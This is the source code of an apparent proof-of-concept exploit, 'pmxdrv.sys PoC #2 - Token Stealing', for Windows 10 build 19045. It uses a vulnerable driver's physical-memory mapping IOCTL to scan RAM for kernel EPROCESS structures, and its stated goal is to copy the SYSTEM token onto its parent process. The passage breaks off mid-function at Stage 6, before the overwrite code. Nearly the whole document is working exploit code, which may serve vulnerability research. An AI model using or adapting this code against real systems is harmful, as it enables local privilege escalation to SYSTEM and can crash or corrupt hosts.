/*
pmxdrv.sys PoC # 2 - Token Stealing

Target: Windows 10 x64 build 19045.

High-level flow:
   1. Validate the OS build
   2. Resolve the PoC's parent process
   3. Open the vulnerable driver and confirm a physical-read primitive
   4. Enumerate Windows-described physical RAM ranges
   5. Scan RAM for validated EPROCESS candidates
   6. Resolve SYSTEM and parent process physical address from the candidate list
   7. Overwrite the parent's EPROCESS.Token with SYSTEM's

This code is build-specific: incorrect offsets or physical addresses can crash or corrupt the host.
 */

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <algorithm>
#include <vector>

#pragma comment(lib, "Advapi32.lib")

 // pmxdrv.sys interface reconstructed in the earlier research stages.
#define DEVICE_NAME                 "\\\\.\\PMXDRV"
#define IOCTL_MAP_PHYSICAL          0x00222AB8

#define PAGE_SIZE_BYTES             0x1000ULL
#define SCAN_START                  0x00100000ULL
#define SCAN_CHUNK_PAGES            256UL
#define SCAN_CHUNK_BYTES            (SCAN_CHUNK_PAGES * PAGE_SIZE_BYTES)

// Little-endian representation of the nonpaged-pool tag "Proc".
#define POOL_TAG_PROC               0x636F7250UL

// Windows 10 build 19045 x64 EPROCESS offsets.
#define EPROCESS_PID                0x440
#define EPROCESS_ACTIVE_LINKS       0x448
#define EPROCESS_TOKEN              0x4B8
#define EPROCESS_IMAGE              0x5A8
#define EPROCESS_IMAGE_LENGTH       15
#define EPROCESS_IMAGE_MAX_CHARS    (EPROCESS_IMAGE_LENGTH - 1)

// Build 19045 candidates begin with this observed DWORD at offset +0x00.
#define EPROCESS_START_MARKER     0x00000003UL

#define EPROCESS_REL_MIN            0x40
#define EPROCESS_REL_MAX            0x100
#define EPROCESS_REL_STEP           0x10

// EPROCESS.Token is an EX_FAST_REF: pointer in the upper 60 bits and a live
// cached-reference count in the low four bits.
#define EX_FAST_REF_POINTER_MASK    0xFFFFFFFFFFFFFFF0ULL
#define EX_FAST_REF_LOW_BITS_MASK   0xFULL

#define CM_RESOURCE_TYPE_MEMORY       3
#define CM_RESOURCE_TYPE_MEMORY_LARGE 7
#define RESOURCE_LIST_HEADER_SIZE     0x14
#define RESOURCE_DESCRIPTOR_SIZE      0x14

#pragma pack(push, 1)

typedef struct _PMX_MAP_REQUEST {
    DWORD  Size;
    UINT64 PhysicalAddress;
    DWORD  PageCount;
    UINT64 MappedAddress;
} PMX_MAP_REQUEST;

typedef struct _PMX_IOCTL_INPUT {
    UINT64 RequestAddress;
    DWORD  Flag;
    DWORD  Unknown;
} PMX_IOCTL_INPUT;

#pragma pack(pop)

static_assert(sizeof(PMX_MAP_REQUEST) == 24, "PMX_MAP_REQUEST packing changed");
static_assert(sizeof(PMX_IOCTL_INPUT) == 16, "PMX_IOCTL_INPUT packing changed");

typedef struct _EPROCESS_CANDIDATE {
    UINT64 HeaderPhysicalAddress;
    UINT64 EprocessPhysicalAddress;
    UINT64 HeaderToEprocess;
    UINT64 Pid;
    UINT64 Flink;
    UINT64 Blink;
    UINT64 TokenRaw;
    char   ImageFileName[EPROCESS_IMAGE_LENGTH + 1];
} EPROCESS_CANDIDATE;

typedef struct _PHYSICAL_RANGE {
    UINT64 Start;
    UINT64 Length;
} PHYSICAL_RANGE;

typedef NTSTATUS(NTAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW VersionInformation);
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);

enum class TokenWriteResult {
    WriteFailed,     // physical write did not happen; nothing to roll back
    VerifyFailed,    // write happened, but read-back/pointer comparison failed
    Success          // write happened and pointer verified
};

// Safely reads an 8-byte UINT64 from a byte buffer using memcpy.
// Used when interpreting raw physical memory data as EPROCESS fields.
static UINT64 ReadU64(const BYTE* p)
{
    UINT64 value = 0;
    memcpy(&value, p, sizeof(value));
    return value;
}

// Same idea as ReadU64(), but reads a 4-byte DWORD.
// Used when interpreting raw physical memory data pool headers, pool tags, and ResourceMap fields.
static DWORD ReadU32(const BYTE* p)
{
    DWORD value = 0;
    memcpy(&value, p, sizeof(value));
    return value;
}

// Presentation helper to print numbered stage headings so the PoC output is easier to follow
static void PrintStage(unsigned int number, const char* title)
{
    printf("\n---- [%u] %s ----\n", number, title);
}

//***************************************************************************************************************
// STAGE 1: Validate target environment
//***************************************************************************************************************

// Checks that target build is Windows build 19045.
static BOOL VerifyTargetBuild(void)
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        printf("[-] Could not obtain ntdll handle\n");
        return FALSE;
    }

    RtlGetVersion_t rtlGetVersion = (RtlGetVersion_t)GetProcAddress(ntdll, "RtlGetVersion");

    if (!rtlGetVersion) {
        printf("[-] Could not resolve RtlGetVersion\n");
        return FALSE;
    }

    RTL_OSVERSIONINFOW version = {};
    version.dwOSVersionInfoSize = sizeof(version);

    if (rtlGetVersion(&version) != 0) {
        printf("[-] RtlGetVersion failed\n");
        return FALSE;
    }

    printf("[*] Detected Windows %lu.%lu build %lu\n",
        (unsigned long)version.dwMajorVersion,
        (unsigned long)version.dwMinorVersion,
        (unsigned long)version.dwBuildNumber);

    if (version.dwMajorVersion != 10 || version.dwBuildNumber != 19045) {
        printf("[-] This PoC is restricted to Windows 10 build 19045\n");
        return FALSE;
    }

    return TRUE;
}

//***************************************************************************************************************
// STAGE 2: Resolve parent process
//***************************************************************************************************************

// Resolves the PoC's parent process PID and truncated image name from a Tool Help snapshot
static BOOL GetParentProcessInfo(
    DWORD* parentPid,
    char parentImage[EPROCESS_IMAGE_LENGTH + 1])
{
    if (!parentPid || !parentImage)
        return FALSE;

    *parentPid = 0;
    parentImage[0] = '\0';

    // Obtain a snapshot of all running processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Could not create process snapshot (error %lu)\n", (unsigned long)GetLastError());
        return FALSE;
    }

    // Declares a dynamic list to store entries
    std::vector<PROCESSENTRY32> entries;

    // Process32First requires dwSize to identify the version and size of the
    // PROCESSENTRY32 structure supplied by the caller
    PROCESSENTRY32 entry = {};
    entry.dwSize = sizeof(entry);

    // Retrieve the first process entry in the snapshot
    if (!Process32First(snapshot, &entry)) {
        DWORD error = GetLastError();
        CloseHandle(snapshot);
        printf("[-] Could not read the process snapshot (error %lu)\n", (unsigned long)error);
        return FALSE;
    }

    // Save entry into list, retrieve next record and repeat until no more process entries in the snapshot
    do {
        entries.push_back(entry);
    } while (Process32Next(snapshot, &entry));

    // Capture the enumeration result before CloseHandle
    DWORD enumerationError = GetLastError();
    CloseHandle(snapshot);

    // Process32Next terminate normally with ERROR_NO_MORE_FILES
    // Any other error means the snapshot is partial and cannot be trusted
    if (enumerationError != ERROR_NO_MORE_FILES) {
        printf("[-] Could not enumerate the Windows process list (error %lu)\n",
            (unsigned long)enumerationError);
        return FALSE;
    }

    DWORD currentPid = GetCurrentProcessId();
    DWORD parent = 0;
    BOOL currentEntryFound = FALSE;

    // Lookup 1: Find own PID from list in order to obtain parent PID
    for (const PROCESSENTRY32& candidate : entries) {
        if (candidate.th32ProcessID == currentPid) {
            parent = candidate.th32ParentProcessID;
            currentEntryFound = TRUE;
            break;
        }
    }

    if (!currentEntryFound) {
        printf("[-] Could not locate the PoC's own entry in the snapshot\n");
        return FALSE;
    }

    if (parent == 0) {
        printf("[-] The PoC's process entry reported no parent PID\n");
        return FALSE;
    }

    // Lookup 2: Find parent PID from list in order to obtain parent image name
    const PROCESSENTRY32* parentEntry = NULL;
    for (const PROCESSENTRY32& candidate : entries) {
        if (candidate.th32ProcessID == parent) {
            parentEntry = &candidate;
            break;
        }
    }

    if (!parentEntry) {
        printf("[-] Could not locate the parent entry in the snapshot\n");
        return FALSE;
    }

    // Use the same character limit as the physical memory scanner so that the
    // parent image name and EPROCESS.ImageFileName can be compared apple-to-apple.
    strncpy_s(
        parentImage,
        EPROCESS_IMAGE_LENGTH + 1,
        parentEntry->szExeFile,
        EPROCESS_IMAGE_MAX_CHARS);
    parentImage[EPROCESS_IMAGE_MAX_CHARS] = '\0';

    *parentPid = parent;
    return TRUE;
}

//***************************************************************************************************************
// STAGE 3: Open vulnerable driver and test read primitive
//***************************************************************************************************************

// Opens \\.\PMXDRV with CreateFileA() and returns a handle
static HANDLE OpenDriver(void)
{
    printf("[*] Opening %s...\n", DEVICE_NAME);

    HANDLE driver = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (driver == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device (error %lu)\n", (unsigned long)GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    printf("[+] Device opened successfully\n");
    return driver;
}

// Lowest-level interface to the vulnerable driver behavior.
// Builds the reconstructed request structures, sends IOCTL 0x00222AB8, and receives the
// user-mode address at which the requested physical pages were mapped.
static UINT64 MapPhysicalMemory(
    HANDLE driver,
    UINT64 physicalAddress,
    DWORD pageCount)
{
    // Allocate memory for request structure
    PMX_MAP_REQUEST* request = (PMX_MAP_REQUEST*)VirtualAlloc(
        NULL,
        sizeof(PMX_MAP_REQUEST),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!request) {
        printf("[-] VirtualAlloc failed (error %lu)\n", (unsigned long)GetLastError());
        return 0;
    }

    // Initialise request structure
    request->Size = sizeof(PMX_MAP_REQUEST);
    request->PhysicalAddress = physicalAddress & ~(PAGE_SIZE_BYTES - 1);
    request->PageCount = pageCount;
    request->MappedAddress = 0;

    // Initialise input structure
    PMX_IOCTL_INPUT input = {};
    input.RequestAddress = (UINT64)(uintptr_t)request;
    input.Flag = 0;
    input.Unknown = 0;

    // Trigger physical memory mapping
    BOOL ok = DeviceIoControl(
        driver,
        IOCTL_MAP_PHYSICAL,
        &input,
        sizeof(input),
        NULL,
        0,
        NULL,
        NULL);

    // Retrieve mapped address
    UINT64 mappedAddress = request->MappedAddress;
    DWORD error = ok ? ERROR_SUCCESS : GetLastError();
    VirtualFree(request, 0, MEM_RELEASE);

    if (!ok) {
        printf("[-] DeviceIoControl failed (error %lu)\n", (unsigned long)error);
        return 0;
    }

    if (!mappedAddress) {
        printf("[-] IOCTL returned no mapped address\n");
        return 0;
    }

    return mappedAddress;
}

// Cleans up a mapped view created by MapPhysicalMemory() using NtUnmapViewOfSection()
static BOOL UnmapPhysicalMemory(UINT64 mappedAddress)
{
    static NtUnmapViewOfSection_t ntUnmapViewOfSection = NULL;

    if (!mappedAddress)
        return FALSE;

    if (!ntUnmapViewOfSection) {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) {
            ntUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        }
    }

    if (!ntUnmapViewOfSection) {
        printf("[-] Could not resolve NtUnmapViewOfSection\n");
        return FALSE;
    }

    NTSTATUS status = ntUnmapViewOfSection(GetCurrentProcess(), (PVOID)(uintptr_t)mappedAddress);

    if (status < 0) {
        printf("[-] NtUnmapViewOfSection failed (NTSTATUS 0x%08lX)\n", (unsigned long)(DWORD)status);
        return FALSE;
    }

    return TRUE;
}

// Wrapper which turns the page-mapping capability into a convenient arbitrary physical read primitive.
// Calculates which physical pages contain the requested bytes, maps them, copies the bytes out,
// and immediately unmaps the view.
static BOOL ReadPhysicalMemory(
    HANDLE driver,
    UINT64 physicalAddress,
    void* output,
    SIZE_T size)
{
    // pmxdrv.sys maps complete pages, so calculate the smallest page-aligned view that contains 
    // the caller's requested byte range.
    if (!output || size == 0 ||
        physicalAddress > UINT64_MAX - (UINT64)(size - 1))
        return FALSE;

    UINT64 startPage = physicalAddress & ~(PAGE_SIZE_BYTES - 1);
    UINT64 lastAddress = physicalAddress + size - 1;
    UINT64 endPage = lastAddress & ~(PAGE_SIZE_BYTES - 1);
    UINT64 pages64 = ((endPage - startPage) / PAGE_SIZE_BYTES) + 1;

    if (pages64 == 0 || pages64 > MAXDWORD)
        return FALSE;

    UINT64 mapped = MapPhysicalMemory(driver, startPage, (DWORD)pages64);
    if (!mapped)
        return FALSE;

    SIZE_T offset = (SIZE_T)(physicalAddress - startPage);
    BOOL success = TRUE;

    __try {
        memcpy(output, (const void*)(uintptr_t)(mapped + offset), size);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception reading mapped memory (0x%08lX)\n", GetExceptionCode());
        success = FALSE;
    }

    if (!UnmapPhysicalMemory(mapped))
        success = FALSE;

    return success;
}

//***************************************************************************************************************
// STAGE 4: Read Windows-described physical memory ranges
//***************************************************************************************************************

// Obtains the Windows-described physical memory ranges from HKLM\HARDWARE\RESOURCEMAP\System
// Resources\Physical Memory\.Translated. Prevents the PoC from blindly scanning the entire physical
// address space, including reserved regions and MMIOs.
static BOOL LoadPhysicalMemoryRanges(std::vector<PHYSICAL_RANGE>* ranges)
{
    if (!ranges)
        return FALSE;

    ranges->clear();

    HKEY key = NULL;

    // Open Windows hardware resource map
    LSTATUS status = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0,
        KEY_QUERY_VALUE,
        &key);

    if (status != ERROR_SUCCESS) {
        printf("[-] RegOpenKeyExA for the physical memory map failed (%ld)\n", (long)status);
        return FALSE;
    }

    DWORD type = 0;
    DWORD size = 0;

    // Check size of the data
    status = RegQueryValueExA(
        key,
        ".Translated",
        NULL,
        &type,
        NULL,
        &size);

    if (status != ERROR_SUCCESS || type != REG_RESOURCE_LIST || size < RESOURCE_LIST_HEADER_SIZE) {
        printf("[-] Physical memory resource-list metadata is invalid\n");
        RegCloseKey(key);
        return FALSE;
    }

    // Allocate enough memory to hold data
    std::vector<BYTE> data(size);

    // Read .Translated
    status = RegQueryValueExA(
        key,
        ".Translated",
        NULL,
        &type,
        data.data(),
        &size);
    RegCloseKey(key);

    if (status != ERROR_SUCCESS || type != REG_RESOURCE_LIST ||
        size < RESOURCE_LIST_HEADER_SIZE) {
        printf("[-] Reading the physical memory resource list failed (%ld)\n", (long)status);
        return FALSE;
    }

    // Extract relevant fields from Windows resource structures
    DWORD resourceGroupCount = ReadU32(data.data()); // CM_RESOURCE_LIST.Count
    DWORD resourceDescriptorCount = ReadU32(data.data() + 0x10); // CM_PARTIAL_RESOURCE_LIST.Count

    if (resourceGroupCount != 1 || resourceDescriptorCount == 0 ||
        resourceDescriptorCount > (size - RESOURCE_LIST_HEADER_SIZE) / RESOURCE_DESCRIPTOR_SIZE) {
        printf("[-] Unexpected physical memory resource-list layout\n");
        return FALSE;
    }

    // Parse each CM_PARTIAL_RESOURCE_DESCRIPTOR entry
    for (DWORD i = 0; i < resourceDescriptorCount; i++) {
        const BYTE* descriptor = data.data() + RESOURCE_LIST_HEADER_SIZE + ((SIZE_T)i * RESOURCE_DESCRIPTOR_SIZE);

        // Identify the descriptors that represent memory
        DWORD header = ReadU32(descriptor);
        BYTE resourceType = (BYTE)(header & 0xFF);

        if (resourceType != CM_RESOURCE_TYPE_MEMORY && resourceType != CM_RESOURCE_TYPE_MEMORY_LARGE) {
            continue;
        }

        // Extract Start and Length of memory region
        UINT64 start = ReadU64(descriptor + 4);
        UINT64 length = ReadU64(descriptor + 0x0C);

        // Decodes large-memory encodings
        if ((header & 0xFF000000UL) != 0) {
            if (length > (UINT64_MAX >> 8)) {
                printf("[-] Overflow decoding a physical memory range\n");
                return FALSE;
            }
            length <<= 8;
        }

        // Checks for:
        // 1) empty ranges
        // 2) arithmetic that overflows 64-bit address
        // 3) Start not aligned to 4-KB page boundaries
        // 4) length not aligned to 4-KB page boundaries
        if (length == 0 || start > UINT64_MAX - (length - 1) ||
            (start & (PAGE_SIZE_BYTES - 1)) != 0 ||
            (length & (PAGE_SIZE_BYTES - 1)) != 0) {
            printf("[-] Invalid physical memory range in resource list\n");
            return FALSE;
        }

        // Save valid physical memory range
        PHYSICAL_RANGE range = {};
        range.Start = start;
        range.Length = length;
        ranges->push_back(range);
    }

    if (ranges->empty()) {
        printf("[-] No RAM ranges were present in the resource list\n");
        return FALSE;
    }

    // Sort ranges
    std::sort(
        ranges->begin(),
        ranges->end(),
        [](const PHYSICAL_RANGE& left, const PHYSICAL_RANGE& right) {
            return left.Start < right.Start;
        });

    // Print all physical memory ranges
    printf("[*] Physical RAM ranges from Windows ResourceMap:\n");
    UINT64 totalBytes = 0;

    for (SIZE_T i = 0; i < ranges->size(); i++) {
        const PHYSICAL_RANGE& range = (*ranges)[i];
        printf("    [%zu] 0x%016llX - 0x%016llX  (%llu MB)\n",
            i,
            (unsigned long long)range.Start,
            (unsigned long long)(range.Start + range.Length - 1),
            (unsigned long long)(range.Length / (1024ULL * 1024ULL)));

        if (totalBytes <= UINT64_MAX - range.Length)
            totalBytes += range.Length;
    }

    printf("    Total described RAM: %llu MB\n", (unsigned long long)(totalBytes / (1024ULL * 1024ULL)));
    return TRUE;
}

//***************************************************************************************************************
// STAGE 5: Scan RAM for validated EPROCESS candidates
//***************************************************************************************************************

// Checks if pid is a non-zero 32-bit-sized value
static BOOL IsPlausiblePid(UINT64 pid)
{
    return pid > 0 && pid <= 0xFFFFFFFFULL;
}

// Checks if value represents a plausible x64 kernel virtual addres (i.e. 0xFFFF8xxx xxxxxxxx)
static BOOL IsPlausibleKernelPointer(UINT64 value)
{
    return value >= 0xFFFF800000000000ULL;
}

// Checks if image is nonempty and contains printable ASCII.
static BOOL IsPlausibleImage(const char* image)
{
    if (!image || image[0] == '\0')
        return FALSE;

    for (SIZE_T i = 0; i < EPROCESS_IMAGE_LENGTH && image[i] != '\0'; i++) {
        unsigned char c = (unsigned char)image[i];
        if (c < 0x20 || c > 0x7E)
            return FALSE;
    }

    return TRUE;
}

// Extracts EPROCESS fields at current displacement to perform validation checks
static BOOL BuildCandidateFromPage(
    const BYTE page[PAGE_SIZE_BYTES],
    UINT64 pagePhysicalAddress,
    SIZE_T headerOffset,
    SIZE_T displacement,
    EPROCESS_CANDIDATE* output)
{
    // Check for valid output vector
    if (!output)
        return FALSE;

    // Calculate start of EPROCESS structure
    SIZE_T eprocessOffset = headerOffset + displacement;

    // Calculate end of ImageFileName field since it is the furthest EPROCESS field to be read
    SIZE_T requiredEnd = eprocessOffset + EPROCESS_IMAGE + EPROCESS_IMAGE_LENGTH;

    // Check if the ImageFileName field is inside the current page
    if (requiredEnd > PAGE_SIZE_BYTES)
        return FALSE;

    // Reject a displacement before reading and validating the EPROCESS fields.
    if (ReadU32(page + eprocessOffset) != EPROCESS_START_MARKER)
        return FALSE;

    // Initialize a temporary local candidate
    EPROCESS_CANDIDATE candidate = {};

    // Record physical locations for correlation and validation
    candidate.HeaderPhysicalAddress = pagePhysicalAddress + headerOffset;
    candidate.EprocessPhysicalAddress = pagePhysicalAddress + eprocessOffset;
    candidate.HeaderToEprocess = displacement;

    // Extract EPROCESS fields
    candidate.Pid = ReadU64(page + eprocessOffset + EPROCESS_PID);
    candidate.Flink = ReadU64(page + eprocessOffset + EPROCESS_ACTIVE_LINKS);
    candidate.Blink = ReadU64(page + eprocessOffset + EPROCESS_ACTIVE_LINKS + 8);
    candidate.TokenRaw = ReadU64(page + eprocessOffset + EPROCESS_TOKEN);

    // Decode raw token to extract token pointer
    UINT64 tokenPointer = candidate.TokenRaw & EX_FAST_REF_POINTER_MASK;

    // Extract ImageFileName field
    memcpy(candidate.ImageFileName, page + eprocessOffset + EPROCESS_IMAGE, EPROCESS_IMAGE_LENGTH);
    candidate.ImageFileName[EPROCESS_IMAGE_LENGTH] = '\0';

    // Perform 5 independent checks on extracted fields
    BOOL pidValid = IsPlausiblePid(candidate.Pid);
    BOOL flinkValid = IsPlausibleKernelPointer(candidate.Flink) && (candidate.Flink & 7) == 0; // 8-byte aligned
    BOOL blinkValid = IsPlausibleKernelPointer(candidate.Blink) && (candidate.Blink & 7) == 0; // 8-byte aligned
    BOOL tokenValid = IsPlausibleKernelPointer(tokenPointer);
    BOOL imageValid = IsPlausibleImage(candidate.ImageFileName);

    // Return invalid condition if any of the 5 checks fails
    if (!pidValid || !flinkValid || !blinkValid || !tokenValid || !imageValid) {
        return FALSE;
    }

    // Return valid candidate
    *output = candidate;
    return TRUE;
}

// Checks if a candidate is already stored in list to prevent duplicates
static BOOL CandidateAlreadyStored(
    const std::vector<EPROCESS_CANDIDATE>& candidates,
    UINT64 eprocessPhysicalAddress)
{
    for (const EPROCESS_CANDIDATE& candidate : candidates) {
        if (candidate.EprocessPhysicalAddress == eprocessPhysicalAddress)
            return TRUE;
    }
    return FALSE;
}

// First stage scanner that finds places worth investigating within the given 4 KB physical memory page:
// 1. Searches for 16-byte-aligned pool headers carrying the "Proc" tag
// 2. Tests plausible EPROCESS locations associated with each "Proc" tag
// 3. Validates each location via BuildCandidateFromPage()
// 4. Checks if candidate is already stored via CandidateAlreadyStored()
// 5. Adds candidate to candidate list
static void ScanPageForCandidates(
    const BYTE page[PAGE_SIZE_BYTES],
    UINT64 pagePhysicalAddress,
    std::vector<EPROCESS_CANDIDATE>* candidates,
    SIZE_T* procTags)
{
    // Walks the page in 0x10-byte increments since pool headers are 16-byte aligned.
    // Pool tags are stored 4 bytes into the pool headers,
    // so at least 8 bytes must remain before reading off the pool tag.
    for (SIZE_T headerOffset = 0;
        headerOffset + 8 <= PAGE_SIZE_BYTES;
        headerOffset += 0x10) {

        // Read 4-byte pool tag
        DWORD tag = ReadU32(page + headerOffset + 4);

        // Skip if pool tag is not "Proc"
        if (tag != POOL_TAG_PROC)
            continue;

        // Count every "Proc" tag encountered
        (*procTags)++;

        // Tries the observed range of pool-header-to-EPROCESS displacement
        for (SIZE_T displacement = EPROCESS_REL_MIN;
            displacement <= EPROCESS_REL_MAX;
            displacement += EPROCESS_REL_STEP) {

            // Initialize an empty structure to collect valid EPROCESS objects
            EPROCESS_CANDIDATE candidate = {};

            // Check if location contains valid EPROCESS object
            if (!BuildCandidateFromPage(
                page,
                pagePhysicalAddress,
                headerOffset,
                displacement,
                &candidate)) {
                continue;
            }

            // Check if candidate is already stored
            if (CandidateAlreadyStored(*candidates, candidate.EprocessPhysicalAddress)) {
                continue;
            }

            // Store candidate in candidate list
            candidates->push_back(candidate);
        }
    }
}

// High-level physical memory scanner
static BOOL FindEprocessCandidates(
    HANDLE driver,
    const std::vector<PHYSICAL_RANGE>& ranges,
    std::vector<EPROCESS_CANDIDATE>* candidates)
{
    // Check for valid output vector
    if (!candidates)
        return FALSE;

    // Start each scan with an empty candidate list
    candidates->clear();

    // Initialize stats for each memory range scan
    UINT64 pagesRead = 0;
    UINT64 pagesFailed = 0;
    SIZE_T procTags = 0;

    printf("[>] Scanning Windows-described RAM for validated Proc allocations...\n");

    // Map physical memory in 1 MB chunks instead of one 4 KB page at a time.
    // With SCAN_CHUNK_PAGES = 256, each normal mapping covers 1MB.
    printf("    Chunk size: %lu pages (%llu KB)\n",
        SCAN_CHUNK_PAGES,
        (unsigned long long)(SCAN_CHUNK_BYTES / 1024ULL));

    // Since EPROCESS body is not located at a fixed distance from Proc pool header, ScanPageForCandidates()
    // tests candidate EPROCESS locations from EPROCESS_REL_MIN through EPROCESS_REL_MAX.
    printf("    Candidate displacement: +0x%X through +0x%X, step +0x%X\n",
        EPROCESS_REL_MIN,
        EPROCESS_REL_MAX,
        EPROCESS_REL_STEP);

    // Show the build-specific pre-filter used by the scanner.
    printf("    EPROCESS start marker: 0x%08lX\n",
        (unsigned long)EPROCESS_START_MARKER);

    // Walk each Windows-described physical memory range obtained earlier from LoadPhysicalMemoryRanges()
    for (SIZE_T rangeIndex = 0; rangeIndex < ranges.size(); rangeIndex++) {
        const PHYSICAL_RANGE& range = ranges[rangeIndex];

        // Convert the range's start + length representation into an end address
        UINT64 rangeEnd = range.Start + range.Length;

        // Do not scan below SCAN_START. With SCAN_START = 0x100000, physical addresses below 1 MB are skipped
        UINT64 chunkStart = range.Start < SCAN_START ? SCAN_START : range.Start;

        // Skip if entire range is below SCAN_START
        if (chunkStart >= rangeEnd)
            continue;

        printf("    [RANGE %zu/%zu] 0x%016llX - 0x%016llX\n",
            rangeIndex + 1,
            ranges.size(),
            (unsigned long long)chunkStart,
            (unsigned long long)(rangeEnd - 1));

        // Baseline for the live progress indicator
        const UINT64 rangeScanStart = chunkStart;
        const UINT64 rangeScanSpan = rangeEnd - rangeScanStart;

        // Process the current physical memory range one mapping-sized chunk at a time until its end address is reached
        while (chunkStart < rangeEnd) {

            // Live progress, single updating line per range
            {
                UINT64 scanned = chunkStart - rangeScanStart;
                unsigned pct = rangeScanSpan != 0
                    ? (unsigned)((scanned * 100) / rangeScanSpan)
                    : 100;
                printf("\r        Progress: %3u%%  at PA 0x%016llX   ", pct, (unsigned long long)chunkStart);
                fflush(stdout);
            }

            // Check remaining bytes in current range
            UINT64 remaining = rangeEnd - chunkStart;

            // Scan SCAN_CHUNK_BYTES at a time. For the final chunk of a range, use only the remaining bytes.
            UINT64 chunkBytes = remaining < SCAN_CHUNK_BYTES ? remaining : SCAN_CHUNK_BYTES;

            // Convert the selected chunk size into a page count for MapPhysicalMemory() 
            // since pmxdrv.sys maps complete 4 KB pages.
            DWORD pageCount = (DWORD)(chunkBytes / PAGE_SIZE_BYTES);

            if (pageCount == 0)
                break;

            // Map chunk to user-mode virtual address space
            UINT64 mapped = MapPhysicalMemory(driver, chunkStart, pageCount);

            // Increment failed pages count and proceed to next chunk if mapping fails
            if (!mapped) {
                pagesFailed += pageCount;
                chunkStart += chunkBytes;
                continue;
            }

            // Assume mapped chunk is readable until exception raised below
            BOOL chunkReadable = TRUE;

            __try {
                const BYTE* chunk = (const BYTE*)(uintptr_t)mapped;

                // Break mapped chunk into 4 KB pages
                for (DWORD pageIndex = 0; pageIndex < pageCount; pageIndex++) {

                    // Virtual address of the current page
                    const BYTE* page = chunk + ((SIZE_T)pageIndex * PAGE_SIZE_BYTES);

                    // Corresponding physical address of the same page
                    UINT64 pagePhysicalAddress = chunkStart + ((UINT64)pageIndex * PAGE_SIZE_BYTES);

                    // Search current page for Proc pool tags and append valid EPROCESS candidates to list
                    ScanPageForCandidates(
                        page,
                        pagePhysicalAddress,
                        candidates,
                        &procTags);
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {

                // Report mapped chunk as unreadable if any of the pages are unreadable
                printf("\n[-] Exception scanning physical chunk at 0x%016llX (0x%08lX)\n",
                    (unsigned long long)chunkStart,
                    GetExceptionCode());
                chunkReadable = FALSE;
            }

            // Release mapped view created by every successful MapPhysicalMemory().
            // Failure to unmap is fatal as continuing leaves the scanner's mapping state uncertain.
            if (!UnmapPhysicalMemory(mapped)) {
                printf("\n[-] Mapping cleanup failed; aborting the scan\n");
                return FALSE;
            }

            // Update stats
            if (chunkReadable)
                pagesRead += pageCount;
            else
                pagesFailed += pageCount;

            // Proceed to next chunk in current physical memory range
            chunkStart += chunkBytes;
        }

        printf("\n");
    }

    // Report stats
    printf("\n[*] Scan summary:\n");
    printf("    Pages read successfully: %llu\n", (unsigned long long)pagesRead);
    printf("    Pages failed:            %llu\n", (unsigned long long)pagesFailed);
    printf("    Raw Proc tags:           %zu\n", procTags);

    // Annotate the rejection ratio
    if (procTags > 0) {
        double keptPct = (100.0 * (double)candidates->size()) / (double)procTags;
        printf("    Validated candidates:    %zu  (%.1f%% of raw tags passed the filter)\n",
            candidates->size(), keptPct);
    }
    else {
        printf("    Validated candidates:    %zu\n", candidates->size());
    }

    // Return TRUE only if at least one page was read successfully and no pages failed
    return pagesRead != 0 && pagesFailed == 0;
}

// Prints all validated EPROCESS candidates collected by FindEprocessCandidates().
// Reserved for debugging purposes.
static void PrintEprocessCandidates(
    const std::vector<EPROCESS_CANDIDATE>& candidates)
{
    printf("\n[*] Validated EPROCESS candidate list:\n");
    printf("    Total candidates: %zu\n", candidates.size());

    if (candidates.empty()) {
        printf("    [!] No validated EPROCESS candidates were collected\n");
        return;
    }

    for (SIZE_T i = 0; i < candidates.size(); i++) {
        const EPROCESS_CANDIDATE& candidate = candidates[i];

        // Proc pool tag is located four bytes into the pool header.
        UINT64 procTagPhysicalAddress = candidate.HeaderPhysicalAddress + 4;

        // Split the raw EX_FAST_REF into its pointer and reference bits.
        UINT64 tokenPointer = candidate.TokenRaw & EX_FAST_REF_POINTER_MASK;
        UINT64 tokenRefBits = candidate.TokenRaw & EX_FAST_REF_LOW_BITS_MASK;

        printf("\n");
        printf("    [%zu] %s (PID %llu)\n", i, candidate.ImageFileName, (unsigned long long)candidate.Pid);
        printf("         Pool header PA : 0x%016llX\n", (unsigned long long)candidate.HeaderPhysicalAddress);
        printf("         Proc tag PA    : 0x%016llX\n", (unsigned long long)procTagPhysicalAddress);
        printf("         Displacement   : +0x%llX\n", (unsigned long long)candidate.HeaderToEprocess);
        printf("         EPROCESS PA    : 0x%016llX\n", (unsigned long long)candidate.EprocessPhysicalAddress);
        printf("         Flink          : 0x%016llX\n", (unsigned long long)candidate.Flink);
        printf("         Blink          : 0x%016llX\n", (unsigned long long)candidate.Blink);
        printf("         Token raw      : 0x%016llX\n", (unsigned long long)candidate.TokenRaw);
        printf("         Token pointer  : 0x%016llX\n", (unsigned long long)tokenPointer);
        printf("         Token ref bits : 0x%llX\n", (unsigned long long)tokenRefBits);
    }

    printf("\n");
}

//***************************************************************************************************************
// STAGE 6: Resolve SYSTEM and parent process physical address
//***************************************************************************************************************

// Helper to perform a case-insensitive comparison of two strings
static BOOL ImageEquals(const char* left, const char* right)
{
    return left && right && _stricmp(left, right) == 0;
}

// Search the candidate list for candidates whose PID and ImageFileName matches SYSTEM and parent process
static BOOL ResolveSystemAndParentTargets(
